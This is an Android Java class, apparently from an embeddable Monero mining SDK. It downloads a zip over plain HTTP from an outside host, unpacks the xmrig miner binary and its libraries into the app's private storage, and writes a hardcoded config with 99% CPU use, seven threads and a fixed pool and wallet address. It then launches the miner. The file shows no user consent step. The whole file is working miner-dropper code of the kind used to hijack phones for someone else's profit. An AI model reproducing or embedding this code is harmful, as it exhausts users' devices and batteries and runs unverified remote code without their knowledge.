package waterhole.miner.monero;

import android.annotation.TargetApi;
import android.content.Context;
import android.text.TextUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectStreamException;

import waterhole.miner.core.utils.FileUtils;
import waterhole.miner.core.utils.LogUtils;

import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
import static waterhole.miner.core.utils.FileUtils.downloadFile;
import static waterhole.miner.core.utils.FileUtils.unzip;
import static waterhole.miner.core.utils.IOUtils.closeSafely;
import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.LogUtils.info;
import static waterhole.miner.monero.XmrMiner.LOG_TAG;

final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallback {

    // todo kzw 目前使用测试接口
    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";

    private Process mProcess;
    private String mPrivatePath;
    private OutputReaderThread mOutputHandler;
    private int mAccepted;
    private String mSpeed = "./.";

    private Context mContext;

    private OldXmr() {
    }

    public static OldXmr instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static OldXmr instance = new OldXmr();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    void setContext(Context context) {
        mContext = context;
    }

    void startMine() {
        executeOnThreadPool(new Runnable() {
            @Override
            public void run() {
                downloadFile(OLD_MINER_DOWNLOAD_URL,
                        mContext.getFilesDir().getAbsolutePath() + "/xmr-miner-old.zip",
                        OldXmr.this);
            }
        });
    }

    void stopMine() {
        if (mOutputHandler != null) {
            mOutputHandler.interrupt();
            mOutputHandler = null;
        }
        if (mProcess != null) {
            mProcess.destroy();
            mProcess = null;
            LogUtils.info(LOG_TAG, "stopped");
        }
    }

    private void writeOldConfig(String privatePath) {
        // todo kzw 目前参数写死
        String config = "{\n" +
                "         \"algo\": \"cryptonight\",\n" +
                "         \"av\": 0,\n" +
                "         \"background\": false,\n" +
                "         \"colors\": false,\n" +
                "         \"cpu-affinity\": null,\n" +
                "         \"cpu-priority\": 2,\n" +
                "         \"donate-level\": 0,\n" +
                "         \"log-file\": null,\n" +
                "         \"max-cpu-usage\": 99,\n" +
                "         \"print-time\": 60,\n" +
                "         \"retries\": 5000,\n" +
                "         \"retry-pause\": 5,\n" +
                "         \"safe\": false,\n" +
                "         \"syslog\": false,\n" +
                "         \"threads\": 7,\n" +
                "         \"pools\": [\n" +
                "         {\n" +
                "         \"url\": \"pool.ppxxmr.com:3333\",\n" +
                "         \"user\": \"49MGSvJjQLJRqtyFfB6MRNPqUczEFCP1MKrHozoKx32W3J84sziDqewd6zXceZVXcCNfLwQXXhDJoaZ7hg73mAUdRg5Zqf9\",\n" +
                "         \"pass\": \"x\",\n" +
                "         \"keepalive\": true,\n" +
                "         \"nicehash\": false\n" +
                "         }\n" +
                "         ]\n" +
                "         }";
        info(LOG_TAG, config);
        FileOutputStream outStream = null;
        try {
            File file = new File(privatePath + "/config.json");
            outStream = new FileOutputStream(file);
            outStream.write(config.getBytes());
        } catch (Exception e) {
            error(LOG_TAG, "exception:", e);
        } finally {
            closeSafely(outStream);
        }
    }

    /**
     * thread to collect the binary's output
     */
    @TargetApi(19)
    private final class OutputReaderThread extends Thread {

        private InputStream inputStream;
        private StringBuilder output = new StringBuilder();
        private BufferedReader reader;

        OutputReaderThread(InputStream inputStream) {
            this.inputStream = inputStream;
        }

        public void run() {
            try {
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line + System.lineSeparator());
                    if (line.contains("accepted")) {
                        mAccepted++;
                    } else if (line.contains("speed")) {
                        String[] split = TextUtils.split(line, " ");
                        mSpeed = split[split.length - 2];
                    }
                    info(LOG_TAG, "accepted = " + mAccepted + " ,speed = " + mSpeed);
                }
            } catch (IOException e) {
                error(LOG_TAG, "exception", e);
            }
        }

        public StringBuilder getOutput() {
            return output;
        }
    }

    @Override
    public void onDownloadSuccess(String pathName) {
        info(LOG_TAG, "download old miner success");
        // 旧版门罗挖矿文件
        String fileDir = mContext.getFilesDir().getAbsolutePath();
        File xmrig = new File(fileDir + "/xmrig");
        LogUtils.info(LOG_TAG, "xmrig exist: " + xmrig.exists());
        File uvFile = new File(fileDir + "/libuv.so");
        LogUtils.info(LOG_TAG, "libuv.so exist: " + uvFile.exists());
        File cplusFile = new File(fileDir + "/libc++_shared.so");
        LogUtils.info(LOG_TAG, "libc++_shared.so exist: " + cplusFile.exists());
        if (!xmrig.exists() || !uvFile.exists() || !cplusFile.exists()) {
            unzip(pathName, fileDir, this);
        } else {
            onUnzipComplete(pathName);
        }
    }

    @Override
    public void onDownloadFail(String path, String reason) {
        info(LOG_TAG, "download old miner fail: " + reason);
    }

    @Override
    public void onUnzipComplete(String path) {
        info(LOG_TAG, "unzip old miner success");

        if (mProcess != null) {
            mProcess.destroy();
        }
        // path where we may execute our program
        mPrivatePath = mContext.getFilesDir().getAbsolutePath();
        // write the config
        writeOldConfig(mPrivatePath);
        try {
            // run xmrig using the config
            String[] args = {"./xmrig"};
            ProcessBuilder pb = new ProcessBuilder(args);
            // in our directory
            pb.directory(mContext.getFilesDir());
            // with the directory as ld path so xmrig finds the libs
            pb.environment().put("LD_LIBRARY_PATH", mPrivatePath);
            // in case of errors, read them
            pb.redirectErrorStream();

            mAccepted = 0;
            // run it!
            mProcess = pb.start();
            // start processing xmrig's output
            mOutputHandler = new OutputReaderThread(mProcess.getInputStream());
            mOutputHandler.start();
        } catch (Exception e) {
            LogUtils.error(LOG_TAG, "exception:", e);
            mProcess = null;
        }
    }

    @Override
    public void onUnzipFail(String path, String reason) {
        info(LOG_TAG, "unzip old miner fail: " + reason);
    }

    @Override
    public void onUnzipEntryFail(String path, String reason) {
        info(LOG_TAG, "unzip old miner entry fail: " + reason);
    }
}
